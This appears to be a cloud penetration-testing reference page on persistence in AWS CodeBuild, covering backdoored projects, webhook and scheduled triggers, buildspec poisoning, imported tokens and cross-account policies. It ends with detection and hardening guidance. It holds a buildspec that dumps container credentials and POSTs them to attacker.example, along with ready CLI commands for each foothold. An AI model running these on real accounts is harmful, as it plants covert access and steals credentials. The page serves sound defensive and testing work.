---
cstg_id: CSTG-AWS-CODEBUILD-PERSIST
title: "AWS Codebuild - Persistence"
provider: aws
service: codebuild
phase: persistence
required_access: assumed-breach
required_permissions:
  - codebuild:CreateProject
  - codebuild:UpdateProject
  - codebuild:CreateWebhook
  - codebuild:UpdateWebhook
  - codebuild:ImportSourceCredentials
  - codebuild:PutResourcePolicy
  - codebuild:StartBuild
  - iam:PassRole
  - events:PutRule
  - events:PutTargets
  - scheduler:CreateSchedule
references:
  - https://docs.aws.amazon.com/codebuild/latest/userguide/welcome.html
  - https://docs.aws.amazon.com/codebuild/latest/userguide/github-webhook.html
  - https://docs.aws.amazon.com/codebuild/latest/userguide/build-spec-ref.html
  - https://docs.aws.amazon.com/codebuild/latest/userguide/run-build-with-cron-events.html
  - https://docs.aws.amazon.com/codebuild/latest/userguide/sample-resource-based-policies.html
  - https://docs.aws.amazon.com/codebuild/latest/APIReference/API_ImportSourceCredentials.html
  - https://hackingthe.cloud/aws/post_exploitation/
license: CC BY-SA 4.0
---

## Summary

CodeBuild is well suited to persistence because it provides on-demand code execution as an IAM role and offers several event-driven triggers that can re-launch attacker-controlled builds automatically. An operator who has gained sufficient access can plant a project (or modify an existing one) so that future repository pushes, scheduled events, pipeline runs, or cross-account principals cause a build to run their commands as a privileged service role — re-granting access long after the original entry vector is closed. Many of these mechanisms blend into normal CI activity, making them low-signal.

This page catalogs durable footholds in CodeBuild: backdoored projects, webhook auto-triggers, scheduled (cron) builds, repo-resident buildspec poisoning, imported source credentials, cross-account resource policies, and re-entrant credential dumps. Enumeration is covered in [aws-codebuild-enum.md](../02-services/aws-codebuild-enum.md); the privilege-escalation primitives these footholds reuse are covered in [aws-codebuild-privesc.md](../03-privilege-escalation/aws-codebuild-privesc.md).

## Prerequisites

- An assumed-breach foothold with one or more of the permissions in the frontmatter. Different techniques require different permissions; each is noted below.
- A target service role (ideally already privileged and trusting `codebuild.amazonaws.com`) to attach to the persistent project, plus `iam:PassRole` for that role when creating/updating the project.
- For webhook persistence, a connected GitHub/GitHub Enterprise/Bitbucket source (or the ability to import credentials for one).
- Outbound egress from builds if credentials are exfiltrated to an external collector.

## Exploitation

The persistence mechanisms below all converge on the same payload: a buildspec that runs attacker code as the service role (commonly dumping the container credentials and/or performing privileged actions). What varies is the **trigger** that re-runs it.

```yaml
# Reusable persistence payload (inline or repo-resident buildspec)
version: 0.2
phases:
  build:
    commands:
      - curl -s "169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}" > /tmp/c.json
      - aws sts get-caller-identity
      - curl -s -X POST -d @/tmp/c.json https://attacker.example/beacon || true
```

### Backdoored project with a privileged service role

Create a dedicated, innocuously named project that passes a privileged role and carries the persistence payload as an inline buildspec. It sits dormant until triggered (manually via `StartBuild`, or by any of the triggers below).

```bash
aws codebuild create-project \
  --name build-cache-warmer \
  --source '{"type":"NO_SOURCE","buildspec":"<payload>"}' \
  --artifacts '{"type":"NO_ARTIFACTS"}' \
  --environment '{"type":"LINUX_CONTAINER","image":"aws/codebuild/standard:7.0","computeType":"BUILD_GENERAL1_SMALL"}' \
  --service-role arn:aws:iam::<acct>:role/<privileged-role>
```

Requires `codebuild:CreateProject` + `iam:PassRole`.

### Webhook auto-trigger (event-driven re-entry)

Attach a webhook to a GitHub/GitHub Enterprise/Bitbucket-sourced project so that source events automatically launch builds. With a permissive filter (for example, build on every push, or on pull requests including those from forks), the operator — or anyone able to push or open a PR — re-triggers the payload without further AWS access.

```bash
aws codebuild create-webhook \
  --project-name <project> \
  --filter-groups '[[{"type":"EVENT","pattern":"PUSH,PULL_REQUEST_CREATED,PULL_REQUEST_UPDATED"}]]'

# Or broaden an existing webhook
aws codebuild update-webhook \
  --project-name <project> \
  --filter-groups '[[{"type":"EVENT","pattern":"PUSH"}]]'
```

Requires `codebuild:CreateWebhook`/`UpdateWebhook`. Combined with a repo-resident buildspec this gives durable, externally reachable re-entry. Building fork PRs makes it triggerable by anyone on the internet.

### Scheduled builds via EventBridge rule or scheduler

Create a recurring schedule that starts the backdoored build on a cron/rate cadence, providing time-based re-entry independent of source events. EventBridge invokes `codebuild:StartBuild` through a rule target using an invocation role.

```bash
aws events put-rule --name nightly-cache --schedule-expression 'rate(1 day)'
aws events put-targets --rule nightly-cache \
  --targets '[{"Id":"1","Arn":"<project-arn>","RoleArn":"<eventbridge-invoke-role>"}]'

# EventBridge Scheduler alternative
aws scheduler create-schedule \
  --name nightly-cache \
  --schedule-expression 'rate(1 day)' \
  --flexible-time-window '{"Mode":"OFF"}' \
  --target '{"Arn":"arn:aws:scheduler:::aws-sdk:codebuild:startBuild","RoleArn":"<role>","Input":"{\"projectName\":\"<project>\"}"}'
```

Requires `events:PutRule`/`events:PutTargets` (or `scheduler:CreateSchedule`) plus an invocation role with `codebuild:StartBuild`.

### Repository-resident buildspec poisoning

If a legitimate project pulls its buildspec from source (`buildspec.yml`), committing the payload to the built branch makes every future build run it as the service role — no CodeBuild API change is required, so it survives CodeBuild-side audits and review of the project definition. This is durable as long as the poisoned commit remains and the project keeps building that branch.

### Imported source credentials

Importing or replacing source credentials lets builds authenticate to attacker-controlled or attacker-accessible repositories, and can backdoor source access for connected providers.

```bash
aws codebuild import-source-credentials \
  --server-type GITHUB --auth-type PERSONAL_ACCESS_TOKEN \
  --token <attacker-controlled-PAT>
```

Requires `codebuild:ImportSourceCredentials`. This both enables private-repo builds the operator controls and plants a credential that may itself be abused.

### Cross-account resource policy

Attach a resource-based policy to a project (or report group) granting an external account principal the ability to start builds or read reports, creating a cross-account re-entry path that does not depend on any identity inside the target account.

```bash
aws codebuild put-resource-policy \
  --resource-arn <project-arn> \
  --policy '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"AWS":"arn:aws:iam::<attacker-acct>:root"},"Action":["codebuild:StartBuild","codebuild:BatchGetProjects"],"Resource":"<project-arn>"}]}'
```

Requires `codebuild:PutResourcePolicy`. The external principal can later trigger the backdoored build at will.

### Long-lived credential re-mint

A scheduled or webhook-triggered build that simply re-dumps the service-role container credentials provides a renewable credential supply: even though each set of temporary credentials expires, the trigger mints fresh ones on each run, so the operator never needs to retain valid keys between runs.

## Detection & Logging

**CloudTrail** records the control-plane actions that establish each foothold:

- `CreateProject`/`UpdateProject` (especially with a privileged `serviceRole` and inline buildspec containing credential-dump commands), correlated with `iam:PassRole`.
- `CreateWebhook`/`UpdateWebhook`, particularly filters that include `PULL_REQUEST_*` or broad `PUSH` patterns. Treat new or broadened webhooks on privileged projects as suspicious.
- `ImportSourceCredentials` / `DeleteSourceCredentials` — credential import outside change-management is a strong indicator.
- `PutResourcePolicy` granting an external account — review every cross-account grant.
- `events:PutRule`/`PutTargets` and `scheduler:CreateSchedule` whose target is a CodeBuild project, especially newly created schedules.
- Recurring builds whose `initiator` is EventBridge/Scheduler or a webhook on a project that has no business running on a schedule, and service-role credentials appearing off-box (non-CodeBuild source IP/user agent) after each run.

Defenders should baseline the set of projects, webhooks, schedules, source credentials, and resource policies, then alert on additions or modifications. Builds that repeatedly call `secretsmanager:GetSecretValue`/`ssm:GetParameter` or `sts:AssumeRole` on a cadence are a re-entry signature. Note that repo-resident buildspec poisoning leaves little CloudTrail evidence on the AWS side — source-control history and build-log review are needed to detect it.

## Remediation & Hardening

- Inventory and review all CodeBuild projects, webhooks, EventBridge/Scheduler targets, imported source credentials, and resource policies on a recurring basis; remove unrecognized entries. Alert on creation/modification of any of these.
- Restrict the privileges needed to persist: `CreateProject`, `UpdateProject`, `CreateWebhook`, `UpdateWebhook`, `ImportSourceCredentials`, `PutResourcePolicy`, and `iam:PassRole` should be tightly held and audited.
- Disable fork-PR builds and scope webhook filter groups to trusted branches/actors; prefer manual approval for builds of untrusted input.
- Use least-privilege, per-project service roles so a backdoored build cannot reach unrelated resources; scope `iam:PassRole` with an `iam:PassedToService` condition.
- For high-privilege projects, use administrator-controlled inline buildspecs and protected source branches with required reviews to prevent repo-resident buildspec poisoning.
- Block cross-account resource policies with an SCP or review them against an allowlist of trusted accounts.
- Rotate and minimally scope stored source credentials; alert on `ImportSourceCredentials`.
- Monitor for service-role temporary credentials used outside CodeBuild source ranges and for recurring secret/AssumeRole access from build sessions.
- Keep CloudTrail enabled in every region with log-file validation; restrict and monitor read access to build logs and artifact buckets.

## Tools

- AWS CLI (`aws codebuild`, `aws events`, `aws scheduler`, `aws iam`)
- AWS SDKs for scripted deployment and beaconing
- Cloud posture / drift-detection tooling to baseline projects, webhooks, schedules, credentials, and resource policies
- CloudTrail / log analytics for detection of persistence-establishing API calls

## References

- AWS CodeBuild User Guide — https://docs.aws.amazon.com/codebuild/latest/userguide/welcome.html
- GitHub webhook events for CodeBuild — https://docs.aws.amazon.com/codebuild/latest/userguide/github-webhook.html
- Buildspec reference — https://docs.aws.amazon.com/codebuild/latest/userguide/build-spec-ref.html
- Run CodeBuild builds on a schedule (EventBridge) — https://docs.aws.amazon.com/codebuild/latest/userguide/run-build-with-cron-events.html
- Sample resource-based policies — https://docs.aws.amazon.com/codebuild/latest/userguide/sample-resource-based-policies.html
- ImportSourceCredentials API — https://docs.aws.amazon.com/codebuild/latest/APIReference/API_ImportSourceCredentials.html
- HackingThe.Cloud — AWS post-exploitation — https://hackingthe.cloud/aws/post_exploitation/
